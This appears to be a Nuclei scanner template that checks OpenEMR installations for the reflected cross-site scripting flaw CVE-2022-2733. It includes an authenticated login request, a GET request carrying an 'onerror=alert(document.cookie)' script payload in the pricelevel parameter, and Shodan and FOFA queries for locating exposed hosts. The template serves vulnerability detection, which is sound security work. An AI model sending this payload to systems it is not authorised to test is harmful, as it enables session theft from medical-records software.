http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src=a onerror=alert(document.cookie)>
    - pricelevel
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{RootURL}}/interface/login/login.php?site=default


    new_login_session_management=1&languageChoice=1&authUser={{username}}&clearPass={{password}}&languageChoice=1

    '
  - 'GET /interface/forms/fee_sheet/review/fee_sheet_options_ajax.php?pricelevel=%3Cimg%20src=a%20onerror=alert(document.cookie)%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-2733
info:
  author: ctflearner
  classification:
    cpe: cpe:2.3:a:open-emr:openemr:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-2733
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.99518
    epss-score: 0.89261
  description: 'Cross-site Scripting (XSS) - Reflected in GitHub repository openemr/openemr
    prior to 7.0.0.1.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - icon_hash=1971268439
    - body="openemr"
    - title="openemr"
    - app="openemr"
    google-query: intitle:"openemr"
    max-request: 2
    product: openemr
    shodan-query:
    - title:"OpenEMR"
    - http.html:"openemr"
    - http.title:"openemr"
    - http.favicon.hash:1971268439
    vendor: open-emr
    verified: true
  name: Openemr < 7.0.0.1 - Cross-Site Scripting
  reference:
  - https://huntr.dev/bounties/25b91301-dfb0-4353-a732-e051bbe8420c/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2733
  - https://github.com/openemr/openemr/commit/59458bc15ab0cb556c521de9d5187167d6f88945
  remediation: 'Upgrade Openemr to version 7.0.0.1 or later to mitigate this vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,openemr,authenticated,huntr,open-emr,vuln
